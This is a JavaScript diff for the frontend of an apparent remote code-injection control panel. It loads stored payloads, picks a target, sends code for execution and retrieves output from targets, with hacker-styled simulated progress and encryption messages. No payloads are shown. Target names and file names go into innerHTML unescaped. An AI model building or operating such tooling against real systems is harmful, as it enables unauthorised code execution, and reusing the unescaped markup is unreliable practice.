+        formatTimestamp(timestamp) {
+            try {
+                const date = timestamp ? new Date(timestamp) : new Date();
+                return date.toLocaleTimeString([], { 
+                    hour: '2-digit', 
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+            } catch (e) {
+                return new Date().toLocaleTimeString([], { 
+                    hour: '2-digit', 
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+            }
+        }
+        
+        /**
+         * Escape HTML to prevent XSS
+         * @param {string} text - Text to escape
+         * @returns {string} Escaped text
+         */
+        escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        /**
+         * Ensure the output panel is visible when we get notifications
+         */
+        ensureOutputPanelVisible() {
+            // Switch to output panel if we're not already there
+            const outputPanel = document.getElementById('outputPanel');
+            if (outputPanel && outputPanel.style.display === 'none') {
+                // Add a console message to suggest checking output panel
+                this.addConsoleOutput('[INFO] New output notification received. Check OUTPUT panel.', 'info');
+            }
+        }
+        
+        /**
+         * Show output details modal with fetched data
+         * @param {string} ID - The ID of the injection payload
+         * @param {string} targetName - The target name for display
+         * @param {string} payloadName - The payload name for debugging
+         */
+        async showOutputDetails(ID, targetName, payloadName) {
+            const modal = document.getElementById('outputModal');
+            const outputTitle = document.getElementById('outputTitle');
+            const modalOutput = document.getElementById('modalOutput');
+            
+            if (!modal || !outputTitle || !modalOutput) return;
+            
+            // Set loading state
+            outputTitle.innerHTML = `<i class="fas fa-terminal"></i> OUTPUT - ${targetName || 'Loading...'}`;
+            modalOutput.innerHTML = `
+                <div class="loading-container">
+                    <div class="matrix-spinner"></div>
+                    <div class="loading-text">[FETCHING OUTPUT DATA...]</div>
+                    <div class="loading-details" style="margin-top: 10px; color: #666; font-size: 12px;">
+                        ID: ${ID || 'N/A'}<br>
+                        Target: ${targetName || 'N/A'}<br>
+                        Payload: ${payloadName || 'N/A'}
+                    </div>
+                </div>
+            `;
+            
+            modal.style.display = 'flex';
+            
+            try {
+                // Fetch output data from server
+                this.addConsoleOutput(`[OUTPUT] Fetching output for ID: ${ID}`, 'info');
+                
+                const response = await fetch(`/code_injection/get_output/${ID}`);
+                
+                if (!response.ok) {
+                    let errorMessage = `HTTP ${response.status}`;
+                    if (response.status === 404) {
+                        errorMessage = 'Output data not found. The output may not have been generated yet or the ID is incorrect.';
+                    } else if (response.status === 401) {
+                        errorMessage = 'Unauthorized access. Please log in again.';
+                    } else if (response.status === 500) {
+                        errorMessage = 'Server error while fetching output.';
+                    }
+                    
+                    throw new Error(errorMessage);
+                }
+                
+                const data = await response.json();
+                
+                if (data.error) {
+                    throw new Error(data.error);
+                }
+                
+                // Display the output with close button
+                this.displayOutputInModal(data.outputs, targetName, modalOutput);
+                
+                // Mark notification as read
+                this.markNotificationAsRead(ID);
+                
+                // Save changes to storage
+                this.saveActiveNotifications();
+                
+            } catch (error) {
+                console.error('Error fetching output:', error);
+                modalOutput.innerHTML = `
+                    <div class="error-container">
+                        <div class="error-icon">⚠️</div>
+                        <div class="error-title">OUTPUT RETRIEVAL FAILED</div>
+                        <div class="error-message">${error.message}</div>
+                        <div class="error-details">
+                            [DEBUG INFO]<br>
+                            ID: ${ID || 'Not provided'}<br>
+                            Target: ${targetName || 'Not provided'}<br>
+                            Payload: ${payloadName || 'Not provided'}<br>
+                            Time: ${new Date().toLocaleString()}
+                        </div>
+                        <div class="error-solutions" style="margin-top: 15px; padding: 10px; background: rgba(255, 170, 0, 0.1); border-radius: 4px;">
+                            <strong>Possible Solutions:</strong><br>
+                            1. Check if the payload execution completed<br>
+                            2. Verify the ID exists in the database<br>
+                            3. Check server logs for errors<br>
+                            4. Try refreshing the page
+                        </div>
+                        <div style="display: flex; gap: 10px; margin-top: 15px; justify-content: center;">
+                            <button class="retry-btn" onclick="codeEditor.showOutputDetails('${ID}', '${targetName}', '${payloadName}')">
+                                <i class="fas fa-sync-alt"></i> RETRY
+                            </button>
+                            <button class="editor-btn secondary" onclick="codeEditor.closeOutputModal()" style="background: rgba(255, 0, 51, 0.2); color: #ff0033; border-color: #ff0033;">
+                                <i class="fas fa-times"></i> CLOSE
+                            </button>
+                        </div>
+                    </div>
+                `;
+                
+                this.addConsoleOutput(`[ERROR] Failed to fetch output: ${error.message}`, 'error');
+                this.addConsoleOutput(`[DEBUG] Output ID: ${ID}, Target: ${targetName}`, 'info');
+            }
+        }
+        
+        /**
+         * Display output data in the modal
+         * @param {any} outputData - The output data to display
+         * @param {string} targetName - The target name
+         * @param {HTMLElement} modalOutput - The modal output container
+         */
+        displayOutputInModal(outputData, targetName, modalOutput) {
+            if (!outputData || outputData === "No output found." || outputData === "Error retrieving output.") {
+                modalOutput.innerHTML = `
+                    <div class="no-output-container">
+                        <div class="no-output-icon"><i class="fas fa-inbox"></i></div>
+                        <div class="no-output-title">NO OUTPUT AVAILABLE</div>
+                        <div class="no-output-message">Payload execution has not produced any output yet.</div>
+                        <div class="no-output-details" style="margin-top: 15px; color: #666; font-size: 12px;">
+                            Target: ${targetName}<br>
+                            Status: Output may be pending or empty
+                        </div>
+                        <div style="margin-top: 20px;">
+                            <button class="editor-btn" onclick="codeEditor.closeOutputModal()" style="background: rgba(255, 0, 51, 0.2); color: #ff0033; border-color: #ff0033;">
+                                <i class="fas fa-times"></i> CLOSE
+                            </button>
+                        </div>
+                    </div>
+                `;
+                return;
+            }
+            
+            // Clear modal
+            modalOutput.innerHTML = '';
+            
+            // Create modal header with close button
+            const header = document.createElement('div');
+            header.className = 'output-modal-header';
+            header.innerHTML = `
+                <h3 style="color: #00ff41; margin: 0; font-family: 'JetBrains Mono', monospace;">
+                    <i class="fas fa-terminal"></i> OUTPUT - ${targetName}
+                </h3>
+                <button class="close-output-btn" onclick="codeEditor.closeOutputModal()" style="background: none; border: none; color: #00ff41; font-size: 20px; cursor: pointer; padding: 5px;">
+                    <i class="fas fa-times"></i>
+                </button>
+            `;
+            modalOutput.appendChild(header);
+            
+            // Create output header with copy/download buttons
+            const outputHeader = document.createElement('div');
+            outputHeader.className = 'output-header';
+            outputHeader.innerHTML = `
+                <div class="output-header-left">
+                    <div class="output-target">
+                        <i class="fas fa-crosshairs"></i> ${targetName}
+                    </div>
+                    <div class="output-timestamp">
+                        <i class="far fa-clock"></i> ${new Date().toLocaleString()}
+                    </div>
+                </div>
+                <div class="output-header-right">
+                    <button class="copy-output-btn" onclick="codeEditor.copyOutputToClipboard()">
+                        <i class="far fa-copy"></i> COPY
+                    </button>
+                    <button class="download-output-btn" onclick="codeEditor.downloadOutput()">
+                        <i class="fas fa-download"></i> DOWNLOAD
+                    </button>
+                </div>
+            `;
+            modalOutput.appendChild(outputHeader);
+            
+            // Create output content container
+            const contentContainer = document.createElement('div');
+            contentContainer.className = 'output-content';
+            
+            // Handle different types of output data
+            if (typeof outputData === 'string') {
+                if (outputData.includes('\n') || outputData.includes('<br>')) {
+                    // Multi-line string output
+                    const lines = outputData.replace(/<br\s*\/?>/gi, '\n').split('\n');
+                    const pre = document.createElement('pre');
+                    pre.className = 'output-pre';
+                    
+                    lines.forEach((line, index) => {
+                        const lineSpan = document.createElement('span');
+                        lineSpan.className = 'output-line';
+                        lineSpan.textContent = line;
+                        
+                        // Add line number
+                        const lineNumber = document.createElement('span');
+                        lineNumber.className = 'output-line-number';
+                        lineNumber.textContent = (index + 1).toString().padStart(4, '0');
+                        
+                        const lineContainer = document.createElement('div');
+                        lineContainer.className = 'output-line-container';
+                        lineContainer.appendChild(lineNumber);
+                        lineContainer.appendChild(lineSpan);
+                        pre.appendChild(lineContainer);
+                    });
+                    
+                    contentContainer.appendChild(pre);
+                } else {
+                    // Single line string
+                    const singleLine = document.createElement('div');
+                    singleLine.className = 'output-single-line';
+                    singleLine.textContent = outputData;
+                    contentContainer.appendChild(singleLine);
+                }
+            } else if (typeof outputData === 'object') {
+                // JSON output
+                const pre = document.createElement('pre');
+                pre.className = 'output-json';
+                pre.textContent = JSON.stringify(outputData, null, 2);
+                contentContainer.appendChild(pre);
+            }
+            
+            modalOutput.appendChild(contentContainer);
+            
+            // Add close button at the bottom
+            const closeFooter = document.createElement('div');
+            closeFooter.className = 'output-modal-footer';
+            closeFooter.style = 'margin-top: 20px; padding-top: 15px; border-top: 1px solid rgba(0, 255, 65, 0.2); text-align: center;';
+            closeFooter.innerHTML = `
+                <button class="editor-btn" onclick="codeEditor.closeOutputModal()" style="background: rgba(255, 0, 51, 0.2); color: #ff0033; border-color: #ff0033; padding: 8px 20px;">
+                    <i class="fas fa-times"></i> CLOSE OUTPUT
+                </button>
+            `;
+            modalOutput.appendChild(closeFooter);
+            
+            // Store output data for download/copy
+            modalOutput.dataset.outputData = typeof outputData === 'string' ? outputData : JSON.stringify(outputData);
+            
+            // Add console log
+            this.addConsoleOutput(`[OUTPUT] Displaying output for ${targetName}`, 'success');
+        }
+        
+        /**
+         * Dismiss an output notification
+         * @param {string} notificationId - The ID of the notification to dismiss
+         */
+        dismissOutputNotification(notificationId) {
+            const notification = document.getElementById(notificationId);
+            if (notification) {
+                notification.style.animation = 'slideOutRight 0.3s ease-out';
+                setTimeout(() => {
+                    if (notification.parentNode) {
+                        notification.parentNode.removeChild(notification);
+                        this.updateNotificationBadge();
+                        
+                        // Save changes to storage
+                        this.saveActiveNotifications();
+                    }
+                }, 300);
+            }
+        }
+        
+        /**
+         * Mark a notification as read
+         * @param {string} ID - The injection payload ID
+         */
+        markNotificationAsRead(ID) {
+            // Find and update the corresponding notification
+            const notification = document.querySelector(`.output-item[data-update-id="${ID}"]`);
+            if (notification) {
+                notification.classList.add('read');
+                
+                // Update status badge
+                const statusBadge = notification.querySelector('.status-badge');
+                if (statusBadge) {
+                    statusBadge.classList.remove('status-pending');
+                    statusBadge.classList.add('status-viewed');
+                    statusBadge.textContent = 'VIEWED';
+                }
+            }
+        }
+        
+        /**
+         * Update the notification badge count
+         */
+        updateNotificationBadge() {
+            const badge = document.getElementById('outputNotificationBadge');
+            const outputItems = document.querySelectorAll('.output-item');
+            
+            if (badge) {
+                const unreadCount = Array.from(outputItems).filter(item => !item.classList.contains('read')).length;
+                
+                if (unreadCount > 0) {
+                    badge.textContent = unreadCount > 99 ? '99+' : unreadCount;
+                    badge.style.display = 'flex';
+                    
+                    // Add animation for new notifications
+                    if (unreadCount === 1) {
+                        badge.classList.add('pulse');
+                        setTimeout(() => badge.classList.remove('pulse'), 1000);
+                    }
+                } else {
+                    badge.style.display = 'none';
+                }
+            }
+        }
+        
+        /**
+         * Copy output to clipboard
+         */
+        copyOutputToClipboard() {
+            const modalOutput = document.getElementById('modalOutput');
+            if (!modalOutput || !modalOutput.dataset.outputData) return;
+            
+            try {
+                const outputData = modalOutput.dataset.outputData;
+                const textToCopy = outputData;
+                
+                navigator.clipboard.writeText(textToCopy).then(() => {
+                    // Show success message
+                    const copyBtn = modalOutput.querySelector('.copy-output-btn');
+                    if (copyBtn) {
+                        const originalHTML = copyBtn.innerHTML;
+                        copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
+                        copyBtn.classList.add('success');
+                        
+                        setTimeout(() => {
+                            copyBtn.innerHTML = originalHTML;
+                            copyBtn.classList.remove('success');
+                        }, 2000);
+                    }
+                    
+                    this.addConsoleOutput('[OUTPUT] Output copied to clipboard', 'success');
+                }).catch(err => {
+                    console.error('Failed to copy:', err);
+                    this.addConsoleOutput('[ERROR] Failed to copy output', 'error');
+                });
+            } catch (error) {
+                console.error('Error copying output:', error);
+                this.addConsoleOutput('[ERROR] Failed to copy output', 'error');
+            }
+        }
+        
+        /**
+         * Download output as a file
+         */
+        downloadOutput() {
+            const modalOutput = document.getElementById('modalOutput');
+            if (!modalOutput || !modalOutput.dataset.outputData) return;
+            
+            try {
+                const outputData = modalOutput.dataset.outputData;
+                const textToDownload = outputData;
+                
+                const filename = `output_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
+                const blob = new Blob([textToDownload], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                
+                // Cleanup
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }, 100);
+                
+                this.addConsoleOutput(`[OUTPUT] Output downloaded as ${filename}`, 'success');
+                
+            } catch (error) {
+                console.error('Error downloading output:', error);
+                this.addConsoleOutput('[ERROR] Failed to download output', 'error');
+            }
+        }
+        
+        /**
+         * Clear all output notifications
+         */
+        clearAllOutputNotifications() {
+            const outputItems = document.querySelectorAll('.output-item');
+            outputItems.forEach(item => {
+                item.style.animation = 'slideOutRight 0.3s ease-out';
+                setTimeout(() => {
+                    if (item.parentNode) {
+                        item.parentNode.removeChild(item);
+                    }
+                }, 300);
+            });
+            
+            // Update badge
+            this.updateNotificationBadge();
+            
+            // Save changes to storage
+            this.saveActiveNotifications();
+            
+            // Add console message
+            this.addConsoleOutput('[OUTPUT] All notifications cleared', 'info');
+        }
+        
+        // === FILE LOADING FUNCTION ===
+        async loadPayload(fileName) {
+            if (this.isLoading || !fileName) return;
+            
+            this.isLoading = true;
+            this.currentFile = fileName;
+            
+            // Update UI
+            if (this.currentFileName) this.currentFileName.textContent = fileName.toUpperCase();
+            if (this.fileInfo) this.fileInfo.textContent = `STATUS: LOADING ${fileName}...`;
+            if (this.filePath) this.filePath.textContent = `LOCATION: /payloads/encrypted/${fileName}`;
+            
+            // Show loading state
+            const fileTab = document.getElementById('activeFileTab');
+            let originalContent = '';
+            if (fileTab) {
+                originalContent = fileTab.innerHTML;
+                fileTab.innerHTML = '<div class="loading"></div> DECRYPTING...';
+            }
+            
+            // Update active file item
+            document.querySelectorAll('.file-item').forEach(item => {
+                item.classList.remove('active');
+                if (item.getAttribute('data-filename') === fileName) {
+                    item.classList.add('active');
+                }
+            });
+            
+            // Simulate hacking sequence
+            this.addConsoleOutput(`[ACCESS] Connecting to payload repository...`, 'info');
+            setTimeout(() => {
+                this.addConsoleOutput(`[CRYPTO] Establishing secure channel...`, 'info');
+            }, 300);
+            
+            setTimeout(() => {
+                this.addConsoleOutput(`[DECODE] Decrypting payload: ${fileName}`, 'warning');
+            }, 600);
+            
+            try {
+                // Fetch payload content from server using the new route
+                const response = await fetch(`/code_injection/load_code/${encodeURIComponent(fileName)}`);
+                
+                if (!response.ok) {
+                    if (response.status === 401) {
+                        throw new Error('Unauthorized access. Please log in again.');
+                    }
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data.error) {
+                    throw new Error(data.error);
+                }
+                
+                if (!data.content) {
+                    throw new Error('No content received from server');
+                }
+                
+                // Clear undo/redo stacks
+                this.undoStack = [];
+                this.redoStack = [];
+                
+                // Update editor content
+                if (this.editor) {
+                    this.editor.value = data.content;
+                    this.updateLineNumbers();
+                    this.updateCursorPosition();
+                    this.updateCharCount();
+                }
+                
+                // Add to undo stack
+                this.saveToUndoStack();
+                
+                // Console feedback
+                setTimeout(() => {
+                    this.addConsoleOutput(`[SUCCESS] Payload decrypted: ${fileName}`, 'success');
+                    this.addConsoleOutput(`[INFO] Size: ${data.content.length} bytes`, 'info');
+                    this.addConsoleOutput(`[READY] Payload loaded for injection`, 'success');
+                }, 900);
+                
+                // Update file info
+                if (this.fileInfo) this.fileInfo.textContent = `STATUS: LOADED`;
+                if (this.fileSize) this.fileSize.textContent = `SIZE: ${data.content.length} BYTES`;
+                if (this.fileHash) this.fileHash.textContent = `HASH: ${this.generateHash(data.content)}`;
+                if (this.encryptionStatus) this.encryptionStatus.textContent = `ENCRYPTION: ${this.isEncrypted ? 'ENABLED' : 'DISABLED'}`;
+                
+                // Restore file tab
+                if (fileTab) {
+                    fileTab.innerHTML = `<i class="fas fa-biohazard file-icon"></i> ${fileName.toUpperCase()}`;
+                }
+                
+                // Set connection status
+                if (this.connectionStatus) {
+                    this.connectionStatus.style.background = '#00ff41';
+                }
+                if (this.connectionText) {
+                    this.connectionText.textContent = 'CONNECTION: SECURE';
+                }
+                
+            } catch (error) {
+                console.error('Error loading payload:', error);
+                
+                // Console error
+                this.addConsoleOutput(`[ERROR] Failed to load ${fileName}: ${error.message}`, 'error');
+                this.addConsoleOutput(`[WARNING] Security breach detected`, 'warning');
+                
+                // Update file info
+                if (this.fileInfo) this.fileInfo.textContent = `STATUS: ERROR`;
+                
+                // Restore file tab
+                if (fileTab) {
+                    fileTab.innerHTML = originalContent;
+                }
+                
+                // Set error status
+                if (this.connectionStatus) {
+                    this.connectionStatus.style.background = '#ff0033';
+                }
+                if (this.connectionText) {
+                    this.connectionText.textContent = 'CONNECTION: COMPROMISED';
+                }
+                
+                // Reset current file
+                this.currentFile = null;
+                if (this.currentFileName) this.currentFileName.textContent = 'SELECT_PAYLOAD';
+                
+                // Clear editor
+                if (this.editor) {
+                    this.editor.value = '';
+                    this.updateLineNumbers();
+                    this.updateCharCount();
+                }
+            } finally {
+                this.isLoading = false;
+            }
+        }
+        
+        generateHash(content) {
+            // Simple hash generation for display
+            let hash = 0;
+            for (let i = 0; i < Math.min(content.length, 10); i++) {
+                hash = ((hash << 5) - hash) + content.charCodeAt(i);
+                hash = hash & hash;
+            }
+            return Math.abs(hash).toString(16).toUpperCase().substring(0, 8);
+        }
+        
+        // === EDITOR FUNCTIONALITY ===
+        generateLineNumbers() {
+            if (!this.lineNumbers || !this.editor) return;
+            
+            this.lineNumbers.innerHTML = '';
+            const text = this.editor.value;
+            const lines = text.split('\n');
+            this.lineCount = Math.max(1, lines.length);
+            
+            for (let i = 1; i <= this.lineCount; i++) {
+                const lineNumber = document.createElement('div');
+                lineNumber.className = 'line-number';
+                lineNumber.textContent = i.toString().padStart(3, '0');
+                this.lineNumbers.appendChild(lineNumber);
+            }
+        }
+        
+        updateLineNumbers() {
+            if (!this.editor) return;
+            
+            const text = this.editor.value;
+            const newLineCount = Math.max(1, text.split('\n').length);
+            
+            if (newLineCount !== this.lineCount) {
+                this.lineCount = newLineCount;
+                this.generateLineNumbers();
+            }
+        }
+        
+        updateCursorPosition() {
+            if (!this.cursorPosition || !this.editor) return;
+            
+            const text = this.editor.value;
+            const cursorPos = this.editor.selectionStart;
+            
+            // Calculate line and column
+            const textBeforeCursor = text.substring(0, cursorPos);
+            const lines = textBeforeCursor.split('\n');
+            const line = lines.length;
+            const column = lines[lines.length - 1].length + 1;
+            
+            this.cursorPosition.textContent = `LINE ${line}, COL ${column}`;
+            
+            // Update active line number
+            const lineNumbers = document.querySelectorAll('.line-number');
+            lineNumbers.forEach((num, index) => {
+                num.classList.toggle('active', index + 1 === line);
+            });
+        }
+        
+        updateCharCount() {
+            if (!this.charCount || !this.fileSize || !this.editor) return;
+            
+            const charCount = this.editor.value.length;
+            this.charCount.textContent = `${charCount} BYTES`;
+            this.fileSize.textContent = `SIZE: ${charCount} BYTES`;
+        }
+        
+        saveToUndoStack() {
+            if (!this.editor) return;
+            
+            const content = this.editor.value;
+            if (this.undoStack[this.undoStack.length - 1] !== content) {
+                this.undoStack.push(content);
+                // Limit stack size
+                if (this.undoStack.length > 50) {
+                    this.undoStack.shift();
+                }
+                this.redoStack = [];
+            }
+        }
+        
+        undo() {
+            if (this.undoStack.length > 1) {
+                this.redoStack.push(this.undoStack.pop());
+                const content = this.undoStack[this.undoStack.length - 1];
+                if (this.editor) {
+                    this.editor.value = content;
+                    this.updateLineNumbers();
+                    this.updateCursorPosition();
+                    this.updateCharCount();
+                }
+                this.addConsoleOutput('[EDIT] Undo operation', 'info');
+            }
+        }
+        
+        redo() {
+            if (this.redoStack.length > 0) {
+                const content = this.redoStack.pop();
+                this.undoStack.push(content);
+                if (this.editor) {
+                    this.editor.value = content;
+                    this.updateLineNumbers();
+                    this.updateCursorPosition();
+                    this.updateCharCount();
+                }
+                this.addConsoleOutput('[EDIT] Redo operation', 'info');
+            }
+        }
+        
+        // === MODAL FUNCTIONS ===
+        showSaveModal() {
+            const modal = document.getElementById('saveModal');
+            const input = document.getElementById('payloadNameInput');
+            
+            if (!modal || !input) return;
+            
+            // Set default value if current file exists
+            if (this.currentFile) {
+                input.value = this.currentFile;
+            } else {
+                // Generate a default name based on timestamp
+                const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
+                input.value = `payload_${timestamp}.py`;
+            }
+            
+            input.focus();
+            input.select();
+            
+            modal.style.display = 'flex';
+        }
+        
+        closeSaveModal() {
+            const modal = document.getElementById('saveModal');
+            if (modal) modal.style.display = 'none';
+        }
+        
+        showTargetModal() {
+            const modal = document.getElementById('targetModal');
+            if (!modal) return;
+            
+            modal.style.display = 'flex';
+            
+            // Sync the modal select with the main select
+            if (this.modalTargetSelect && this.targetSelect) {
+                this.modalTargetSelect.value = this.targetSelect.value;
+                this.modalTargetSelect.focus();
+            }
+        }
+        
+        closeTargetModal() {
+            const modal = document.getElementById('targetModal');
+            if (modal) modal.style.display = 'none';
+            this.pendingInjection = false;
+        }
+        
+        closeOutputModal() {
+            const modal = document.getElementById('outputModal');
+            if (modal) {
+                // Add fade out animation
+                modal.style.opacity = '0';
+                modal.style.transition = 'opacity 0.3s';
+                
+                setTimeout(() => {
+                    modal.style.display = 'none';
+                    modal.style.opacity = '1';
+                }, 300);
+            }
+        }
+        
+        // === TARGET SELECTION VALIDATION ===
+        validateTargetSelection() {
+            if (!this.targetSelect) return false;
+            
+            const selectedTarget = this.targetSelect.value;
+            
+            if (!selectedTarget) {
+                // Show error state
+                this.targetSelect.classList.add('error');
+                this.targetSelect.focus();
+                
+                // Show modal asking for target selection
+                this.showTargetModal();
+                return false;
+            }
+            
+            return true;
+        }
+        
+        // === INJECTION FLOW ===
+        async startInjection() {
+            if (!this.currentFile) {
+                this.addConsoleOutput('[ERROR] No payload selected for injection', 'error');
+                return;
+            }
+            
+            // Check if target is selected
+            if (!this.validateTargetSelection()) {
+                this.pendingInjection = true;
+                return;
+            }
+            
+            // Proceed with injection
+            await this.executeInjection();
+        }
+        
+        async useSelectedTargetFromModal() {
+            if (!this.modalTargetSelect) return;
+            
+            const selectedTarget = this.modalTargetSelect.value;
+            
+            if (!selectedTarget) {
+                this.modalTargetSelect.classList.add('error');
+                return;
+            }
+            
+            // Update the main target select
+            if (this.targetSelect) {
+                this.targetSelect.value = selectedTarget;
+                this.targetSelect.classList.remove('error');
+            }
+            
+            // Close the modal
+            this.closeTargetModal();
+            
+            // If there was a pending injection, execute it
+            if (this.pendingInjection) {
+                await this.executeInjection();
+            }
+        }
+        
+        async executeInjection() {
+            if (!this.targetSelect || !this.editor) return;
+            
+            const content = this.editor.value;
+            const selectedTarget = this.targetSelect.value;
+            
+            // Validate that we have a target selected
+            if (!selectedTarget) {
+                this.addConsoleOutput('[ERROR] Please select a target before executing', 'error');
+                this.targetSelect.classList.add('error');
+                this.targetSelect.focus();
+                return;
+            }
+            
+            // Validate that we have content
+            if (!content.trim()) {
+                this.addConsoleOutput('[ERROR] Cannot execute empty payload', 'error');
+                return;
+            }
+            
+            // Determine payload name - use current file or generate a temporary name
+            const payloadName = this.currentFile || `unsaved_payload_${Date.now()}`;
+            
+            try {
+                // Update console with injection sequence
+                this.addConsoleOutput(`[INJECT] Initializing injection sequence...`, 'warning');
+                this.addConsoleOutput(`[TARGET] Selected: ${selectedTarget}`, 'info');
+                this.addConsoleOutput(`[PAYLOAD] Name: ${payloadName}`, 'info');
+                this.addConsoleOutput('[NETWORK] Establishing connection...', 'info');
+                
+                // Send injection request to the exact route
+                const response = await fetch('/code_injection', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        target_name: selectedTarget,
+                        payload_name: payloadName,
+                        payload: content
+                    })
+                });
+                
+                if (!response.ok) {
+                    let errorMessage = `HTTP error! status: ${response.status}`;
+                    try {
+                        const errorData = await response.json();
+                        errorMessage = errorData.error || errorMessage;
+                    } catch (e) {
+                        // If response is not JSON
+                    }
+                    throw new Error(errorMessage);
+                }
+                
+                const result = await response.json();
+                
+                // Handle the response from your route
+                if (result.error) {
+                    throw new Error(result.error);
+                }
+                
+                // Simulate injection progress
+                this.addConsoleOutput('[NETWORK] Connection established', 'success');
+                this.addConsoleOutput('[INJECT] Updating target status in database...', 'info');
+                
+                // Simulate progress with loading animation
+                let progress = 0;
+                const progressInterval = setInterval(() => {
+                    progress += 25;
+                    this.addConsoleOutput(`[PROGRESS] Injection sequence: ${progress}%`, 'info');
+                    
+                    if (progress >= 100) {
+                        clearInterval(progressInterval);
+                        this.addConsoleOutput('[SUCCESS] Injection completed successfully', 'success');
+                        this.addConsoleOutput(`[RESULT] ${result.message || 'Payload injection initiated.'}`, 'success');
+                        this.addConsoleOutput('[DATABASE] Payload stored in code_injection_payloads table', 'info');
+                        this.addConsoleOutput('[DATABASE] Target status updated to Inactive', 'info');
+                        this.addConsoleOutput('[DATABASE] User status set to unchecked', 'info');
+                        
+                        // Update target status in UI
+                        this.updateTargetStatus(selectedTarget, 'injected');
+                        
+                        // Update payload info
+                        if (this.fileInfo) this.fileInfo.textContent = 'STATUS: INJECTED';
+                        
+                        // Check for updates after injection
+                        setTimeout(() => this.checkForUpdates(), 1000);
+                    }
+                }, 500);
+                
+            } catch (error) {
+                this.addConsoleOutput(`[ERROR] Injection failed: ${error.message}`, 'error');
+                this.addConsoleOutput('[SYSTEM] Rolling back changes...', 'warning');
+                
+                // Set connection status to error
+                if (this.connectionStatus) {
+                    this.connectionStatus.style.background = '#ff0033';
+                }
+                if (this.connectionText) {
+                    this.connectionText.textContent = 'CONNECTION: FAILED';
+                }
+                
+                // Reset connection status after delay
+                setTimeout(() => {
+                    if (this.connectionStatus) {
+                        this.connectionStatus.style.background = '#00ff41';
+                    }
+                    if (this.connectionText) {
+                        this.connectionText.textContent = 'CONNECTION: SECURE';
+                    }
+                }, 3000);
+            }
+        }
+        
+        // === FILE OPERATIONS ===
+        async saveFile(payloadName) {
+            if (!this.editor) return { success: false };
+            
+            const content = this.editor.value;
+            
+            if (!content.trim()) {
+                this.addConsoleOutput('[ERROR] Cannot save empty payload', 'error');
+                throw new Error('Cannot save empty payload');
+            }
+            
+            try {
+                this.addConsoleOutput(`[SAVE] Saving payload: ${payloadName}`, 'info');
+                
+                // Send save request to the server endpoint
+                const response = await fetch(`/code_injection/save_code/${encodeURIComponent(payloadName)}`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ code: content })
+                });
+                
+                if (!response.ok) {
+                    if (response.status === 401) {
+                        throw new Error('Unauthorized access. Please log in again.');
+                    }
+                    const errorData = await response.json();
+                    throw new Error(errorData.error || `HTTP error! status: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                
+                if (result.error) {
+                    throw new Error(result.error);
+                }
+                
+                this.addConsoleOutput(`[SUCCESS] ${result.message}`, 'success');
+                this.addConsoleOutput(`[INFO] ${content.length} bytes stored`, 'info');
+                
+                // Update current file if it was a new file
+                if (!this.currentFile || this.currentFile !== payloadName) {
+                    this.currentFile = payloadName;
+                    if (this.currentFileName) this.currentFileName.textContent = payloadName.toUpperCase();
+                    this.addFileToTree(payloadName);
+                    
+                    // Update file info
+                    if (this.filePath) this.filePath.textContent = `LOCATION: /payloads/encrypted/${payloadName}`;
+                    if (this.fileHash) this.fileHash.textContent = `HASH: ${this.generateHash(content)}`;
+                }
+                
+                return { success: true };
+                
+            } catch (error) {
+                this.addConsoleOutput(`[ERROR] Save failed: ${error.message}`, 'error');
+                throw error;
+            }
+        }
+        
+        async saveCurrentFile() {
+            if (this.currentFile) {
+                // Save with current filename
+                try {
+                    const result = await this.saveFile(this.currentFile);
+                    if (result && result.success) {
+                        this.addConsoleOutput(`[INFO] File ${this.currentFile} saved successfully`, 'success');
+                        if (this.fileInfo) this.fileInfo.textContent = 'STATUS: SAVED';
+                    }
+                } catch (error) {
+                    if (this.fileInfo) this.fileInfo.textContent = 'STATUS: ERROR';
+                }
+            } else {
+                // Show modal for new file
+                this.showSaveModal();
+            }
+        }
+        
+        addFileToTree(fileName) {
+            const fileTree = document.getElementById('fileTree');
+            if (!fileTree) return;
+            
+            // Check if file already exists in tree
+            const existingItems = document.querySelectorAll('.file-item[data-filename]');
+            let exists = false;
+            existingItems.forEach(item => {
+                if (item.getAttribute('data-filename') === fileName) {
+                    exists = true;
+                }
+            });
+            
+            if (!exists) {
+                const fileItem = document.createElement('div');
+                
+                fileItem.className = 'file-item';
+                fileItem.setAttribute('data-filename', fileName);
+                fileItem.onclick = () => this.loadPayload(fileName);
+                fileItem.innerHTML = `
+                    <i class="fas fa-file-code"></i>
+                    <span>${fileName}</span>
+                `;
+                
+                fileTree.appendChild(fileItem);
+            }
+        }
+        
+        async encryptFile() {
+            if (!this.currentFile) {
+                this.addConsoleOutput('[ERROR] Select payload first', 'error');
+                return;
+            }
+            
+            if (!this.editor) return;
+            
+            const content = this.editor.value;
+            if (!content.trim()) {
+                this.addConsoleOutput('[ERROR] Cannot encrypt empty payload', 'error');
+                return;
+            }
+            
+            this.addConsoleOutput('[CRYPTO] Initializing encryption sequence...', 'warning');
+            
+            try {
+                // Simulate encryption process (in real scenario, you'd encrypt the content)
+                setTimeout(() => {
+                    this.addConsoleOutput('[CRYPTO] Applying XOR cipher...', 'info');
+                }, 500);
+                
+                setTimeout(() => {
+                    this.addConsoleOutput('[CRYPTO] Applying Base64 encoding...', 'info');
+                }, 1000);
+                
+                setTimeout(async () => {
+                    // Save the (potentially encrypted) content
+                    try {
+                        const result = await this.saveFile(this.currentFile);
+                        if (result && result.success) {
+                            this.addConsoleOutput('[SUCCESS] Payload encrypted and saved successfully', 'success');
+                            this.isEncrypted = true;
+                            if (this.encryptionStatus) this.encryptionStatus.textContent = 'ENCRYPTION: ENABLED';
